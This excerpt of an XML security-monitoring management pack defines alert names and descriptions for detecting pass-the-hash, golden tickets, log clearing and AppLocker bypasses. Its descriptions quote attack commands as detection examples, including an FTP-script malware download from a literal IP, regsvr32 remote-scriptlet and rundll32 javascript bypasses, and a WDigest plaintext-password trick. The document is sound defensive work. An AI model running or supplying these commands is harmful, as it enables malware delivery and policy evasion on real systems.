          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.WCE" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.WCE" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.Mimikatz" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.Mimikatz" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.ProhibitedApp">
          <Name>Security Monitoring:  Prohibited App in Use</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.ProhibitedApp.AlertMessage">
          <Name>Security Monitoring:  Prohibited App in Use</Name>
          <Description>Event Description: {0}

{1}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.ProhibitedApp" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.ProhibitedApp" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.WinRar">
          <Name>Security Monitoring:  WinRar in use</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.WinRar.AlertMessage">
          <Name>Security Monitoring:  WinRar in use</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Health.EventCollectorMonitor">
          <Name>Security Monitoring:  Event Log Collector Service is stopped</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Health.EventCollectorMonitor" SubElementID="wecsvcServiceRunning">
          <Name>Service is running</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Health.EventCollectorMonitor" SubElementID="wecsvcServiceNotRunning">
          <Name>Service is not running</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Health.EventCollectorMonitor_AlertMessageResourceID">
          <Name>Security Monitoring:  Event Log Collector Service is stopped</Name>
          <Description>Please see the alert context for details.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Folder.EventCollectors">
          <Name>Event Collectors</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.View.EventCollectorState">
          <Name>Event Collector State</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.View.EventCollectorAlerts">
          <Name>Event Collector Alerts</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Pth.CredentialSwap">
          <Name>Security Monitoring: Potential Credential Swap in Progress</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Pth.CredentialSwap.AlertMessage">
          <Name>Security Monitoring: Potential Credential Swap in Progress</Name>
          <Description>
            See https://nathangau.wordpress.com/2016/10/14/using-scom-to-detect-successful-pass-the-hash-attacks-part-1/ for details
            Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Pth.CredentialSwap" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Pth.CredentialSwap" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.DomainAdminChange">
          <Name>Security Monitoring:  Domain Admins membership has changed</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.DomainAdminChange.AlertMessage">
          <Name>Security Monitoring: Domain admins membership has changed</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.DomainAdminChange" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.DomainAdminChange" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.RegValueMonitorType">
          <Name>Check value of registry key</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WDigestRegConfiguredMonitor">
          <Name>Security Monitoring:  Wdigest passwords stored in clear text</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WDigestRegConfiguredMonitor" SubElementID="UseLogonCredentialValueGood">
          <Name>RegValueGood</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WDigestRegConfiguredMonitor" SubElementID="UseLogonCredentialValueBad">
          <Name>RegValueBad</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WDigestRegConfiguredMonitor_AlertMessageResourceID">
          <Name>Security Monitoring:  Wdigest registry key has been set to the wrong value</Name>
          <Description>This key is known to be set by attackers to force LSass to store Wdigest passwords in plain text. By setting this key to a value of 1, the attacker can mine a Wdigest password in clear text.


See https://blogs.technet.microsoft.com/kfalde/2014/11/01/kb2871997-and-wdigest-part-1/ for details.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.SchemaAdminChange">
          <Name>Security Monitoring:  Schema Admins membership has changed</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.SchemaAdminChange.AlertMessage">
          <Name>Security Monitoring:  Schema Admins has been modified</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.SchemaAdminChange" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.SchemaAdminChange" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.EnterpriseAdminChange">
          <Name>Security Monitoring:  Enterprise Admins membership has changed</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.EnterpriseAdminChange.AlertMessage">
          <Name>Security Monitoring:  Enterprise Admins membership has changed</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.EnterpriseAdminChange" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.EnterpriseAdminChange" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SecurityLogCleared">
          <Name>Security Monitoring:  Security Log was cleared</Name>
          <Description>Clearing the security log is something an attacker will do to cover their tracks.  By default, logs cycle. If the log has been cleared, this should be investigated.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SecurityLogCleared.AlertMessage">
          <Name>Security Monitoring:  Security Log was cleared</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SecurityLogCleared" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SecurityLogCleared" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.UseLogonCredentialExistsMonitor">
          <Name>Security Monitoring: UseLogonCredential key does not exist</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.UseLogonCredentialExistsMonitor" SubElementID="UseLogonCredentialValueNotExists">
          <Name>ValueMissing</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.UseLogonCredentialExistsMonitor" SubElementID="UseLogonCredentialValueExists">
          <Name>ValueExists</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.UseLogonCredentialExistsMonitor_AlertMessageResourceID">
          <Name>Security Monitoring: UseLogonCredential key does not exist on system</Name>
          <Description>This is a vulnerability in Server 2008 and below. By default, this key is missing, which means that an attacker can use a tool to expose Wdigest credentials stored in plain text in the LSA. 
          It is worth noting that by disabling Wdigest, some legacy applications may break. This should be tested first.  This management pack has a collection rule along with a report that should identify if digest authentication is in use in your environment. This report should tell you where Digest authentication is occuring so that you can fix the applications that are using it.
          
          See https://blogs.technet.microsoft.com/kfalde/2014/11/01/kb2871997-and-wdigest-part-1/ for details.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.RegValueExistsMonitorType">
          <Name>Check Existence of RegKey Monitor Type</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.ServiceCreatedonMemberServer">
          <Name>Security Monitoring: A service was created on a member server</Name>
          <Description>I would consider enabling this rule for any production server that is in a steady state. No services should be created at this point, and any event where one is created would be worthy of investigation.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.ServiceCreatedonMemberServer.AlertMessage">
          <Name>Security Monitoring: A service was created on a member server</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.ServiceCreatedonMemberServer" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.ServiceCreatedonMemberServer" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon">
          <Name>Security Monitoring Threat Hunting:  Special Group logon event</Name>
          <Description>This rule will not generate any noise under normal environment. It requires special groups auditing turned on via GPO as well as the specific memberships to be targeted in the registry. If you've done these tasks, this monitor will alert every time a user that is a member of these </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon.AlertMessage">
          <Name>Security Monitoring Threat Hunting:  Special Group logon event</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.View.ThreatHuntingAlert">
          <Name>Threat Hunting</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.LocalAccountCreatedonServer">
          <Name>Security Monitoring: Local account created on a member server</Name>
          <Description>In a normal environment, this will only happen when the system is setup. You should not see this event on production member servers at all</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.LocalAccountCreatedonServer.AlertMessage">
          <Name>Security Monitoring: Local account created on a member server</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.ServiceKnownThreat">
          <Name>Security Monitoring:  Service associated with a known threat was created on a member server</Name>
          <Description>This is a special case of event ID 7045 targeting the names of services that are created by known tools such as windows credential editor, psexec, etc. If you turned on the generic 7045 rule, this alert should be disabled as it will generate duplicate events.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.ServiceKnownThreat.AlertMessage">
          <Name>Security Monitoring:  Service associated with a known threat was created on a member server</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.EventCollection.SpecialGroupLogon">
          <Name>Security Monitoring Collection:  Event ID 4694</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.EventCollection.BatchLogon">
          <Name>Security Monitoring Collection:  Event ID 4624 Logon Type 4</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.EventCollection.BatchLogon" SubElementID="WriteToDW">
          <Name>Event data publisher</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.EventCollection.BatchLogon" SubElementID="WriteToDB">
          <Name>Event Data Collection Write Action</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.EventCollection.BatchLogon" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ThreatHunt.BatchLogonInUse">
          <Name>Security Monitoring Threat Hunting: Batch Logon in use</Name>
          <Description>This rule checks the security log for event ID 4624 Logon Type 4.  Logon type 4 is a batch logon, which essentially means that there are exposed credentials on this system. Investigation should determine which application is using said credentials. Once the applications are remediated, batch logons can be disabled, making your environment more secure.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ThreatHunt.BatchLogonInUse.AlertMessage">
          <Name>Security Monitoring Threat Hunting: Batch Logon in use</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.EventCollection.GoldenTicket">
          <Name>Security Monitoring Event Collection:  Event ID 4769 result 0x1F</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared">
          <Name>Security Monitoring Forwarded Events:  Security log cleared on a server configured to forward events</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Security log cleared on a server configured to forward events</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.EventCollection.4672">
          <Name>Security Monitoring Collection:  Event ID 4672</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon">
          <Name>Security Monitoring Forwarded Events:  Special Group logon event</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Special Group logon event</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ServiceCreation">
          <Name>Security Monitoring Forwarded Events:  Service Created on system</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ServiceCreation.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Service Created on system</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats">
          <Name>Security Monitoring Forwarded Events:  Service associated with a known threat was created on a forwarding computer</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Service associated with a known threat was created on a member server</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.CredentialSwap">
          <Name>Security Monitoring Forwarded Events:  Potential Credential Swap in Progress</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.CredentialSwap.AlertMessage">
          <Name>Security Monitoring Forwarded Events: Potential Credential Swap in Progress</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.CredentialSwap" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.CredentialSwap" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted">
          <Name>Security Monitoring Forwarded Events:  Local User Created or Deleted in Administrator Security Group</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted.AlertMessage">
          <Name>Security Monitoring Forwarded Events: Local User Created or Deleted in Administrator Security Group</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ProhibitedApp">
          <Name>Security Monitoring Forwarded Events:  Prohibited App in Use</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ProhibitedApp.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Prohibited App in Use</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SmartCardDisabled">
          <Name>Security Monitoring:  A Smart Card has been Disabled to Allow for Interactive Logon</Name>
          <Description>Someone has purposely desected the option to disable smart card authentication for the account.  Verify that this has in fact been approved.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SmartCardDisabled.AlertMessage">
          <Name>Security Monitoring:  A Smart Card has been Disabled to Allow for Interactive Logon</Name>
          <Description>A smartcard has been detected to have been disabled for interactive logons, allowing the individual(s) to bypass logon with a smart card.  Verify that this has been approved.

Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.LocalAdminChange">
          <Name>Security Monitoring:  Local Administrators Group was Modified</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Accounts.LocalAdminChange.AlertMessage">
          <Name>Security Monitoring:  Local Administrators Group was Modified</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.GoldenTicketDetection">
          <Name>Security Monitoring:  Possible Golden Ticket in Use</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.GoldenTicketDetection.AlertMessage">
          <Name>Security Monitoring:  Possible Golden Ticket in Use</Name>
          <Description>
            These are ticket authentication failures. In general 0x1F failures should not happen often, if at all. If you do a rapid reset of the krbtgt password, this will generate alerts on each expired ticket.  There will be lots of them. If you do a rolling reset, allowing AD to replicate, all existing tickets to renew, and account for time skew, any alert generated by this rule is evidence that a golden ticket is in use in your environment.
            For more info:  https://nathangau.wordpress.com/2017/03/08/using-scom-to-detect-golden-tickets/

            Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.GoldenTicketDetection" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.GoldenTicketDetection" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemLogCleared">
          <Name>Security Monitoring:  The system Log was cleared</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemLogCleared.AlertMessage">
          <Name>Security Monitoring:  The system Log was cleared</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SystemLogCleared">
          <Name>Security Monitoring Forwarded Events:  System Log was Cleared</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SystemLogCleared.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  System Log was Cleared</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SystemLogCleared" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.SystemLogCleared" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ProhibitedApp" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.ProhibitedApp" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemLogCleared" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemLogCleared" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule.GPOChange.AlertMessage">
          <Name>Security Monitoring:  GPO Change Occurred</Name>
          <Description>
            GPO Change Information-
            Details: {6}
            Operation Correlation Id: {4}
            Operation Type: {5}


            See:  https://nathangau.wordpress.com/2017/04/17/breaking-apart-the-gpo-modification-process-and-using-scom-to-detect-gpo-changes-part-1/
            and https://nathangau.wordpress.com/2017/04/19/breaking-apart-the-gpo-modification-process-and-using-scom-to-detect-gpo-changes-part-2/
            for more information

          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.GPOMonitoring.Event.DS">
          <Name>GPO Change Event then run correlation script DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule">
          <Name>GPO Change Event then run correlation script Rule</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.RepeatedLogonMonitor">
          <Name>Security Monitoring:  Repeated RDP Logon Failures</Name>
          <Description>Repeated RDP Logon Failures</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.RepeatedLogonMonitor" SubElementID="NotEnoughEvents">
          <Name>Timer Event Raised</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.RepeatedLogonMonitor" SubElementID="TooManyEvents">
          <Name>Repeated Event Raised</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.RepeatedLogonMonitor_AlertMessageResourceID">
          <Name>Security Monitoring:  Repeated RDP Logon Failures</Name>
          <Description>Please see the alert context for details.

{0} typed a bad password accessing directly from computer: {1} from IP: {2} 

If the recovery has been enabled, the Windows Firewall will be modified to block this IP address in response to this monitor state.  See the below article for details on how this monitor works:
https://blogs.technet.microsoft.com/kevinholman/2010/04/12/using-opsmgr-for-intrusion-detection-and-security-hardening/

Note, this alert is a monitor based alert, but it must be closed manually. </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Recovery.BlockPortWindowsFW">
          <Name>Modify Windows Firewall</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousCMD">
          <Name>Security Monitoring:  A suspicious process creation (cmd) was executed</Name>
          <Description>These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousCMD.AlertMessage">
          <Name>Security Monitoring:  Common commands in known malicious scripts</Name>
          <Description>
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousReg">
          <Name>Security Monitoring:  A suspicious process creation (registry) was executed</Name>
          <Description>This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousReg.AlertMessage">
          <Name>Security Monitoring:  A suspicious process creation (registry) was executed</Name>
          <Description>Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousCMD" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousCMD" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousReg" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousReg" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava">
          <Name>Security Monitoring:  A suspicious process creation (AppLocker bypass) was executed</Name>
          <Description>To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe "Rundll32.exe" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";&lt;code&gt;


Events of this nature need to be investigated</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava.AlertMessage">
          <Name>Security Monitoring:  A suspicious process creation (AppLocker bypass) was executed</Name>
          <Description>
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand">
          <Name>Security Monitoring:  A suspicious process creation (FTP script execution via echo command) was executed</Name>
          <Description>Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

"Command Line ": "\"\"\"C:\\Windows\\System32\\cmd.exe\"\" /c \"\"net1 stop sharedaccess&amp;echo open 222.186.58.12 &gt;&gt;  love.txt&amp;echo 123&gt;&gt; love.txt&amp;echo 123&gt;&gt; love.txt&amp;echo binary &gt;&gt; love.txt&amp;echo get r.exe &gt;&gt; love.txt&amp;echo bye &gt;&gt; love.txt&amp;ftp -s:love.txt&amp;p -s:love.txt&amp;r.exe&amp;r.exe&amp;del love.txt /q /f&amp;exit\"\"\"


This type of event is rare and should be investigated</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand.AlertMessage">
          <Name>Security Monitoring:  A suspicious process creation (FTP script execution via echo command) was executed</Name>
          <Description>
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr">
          <Name>Security Monitoring:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited</Name>
          <Description>AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr.AlertMessage">
          <Name>Security Monitoring:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited</Name>
          <Description>
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition">
          <Name>Security Monitoring;  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed</Name>
          <Description>See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible
</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition.AlertMessage">
          <Name>Security Monitoring:  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed</Name>
          <Description>
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (cmd) was executed</Name>
          <Description>These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  Common commands in known malicious scripts</Name>
          <Description>
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (registry) was executed</Name>
          <Description>This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.</Description>
        </DisplayString>
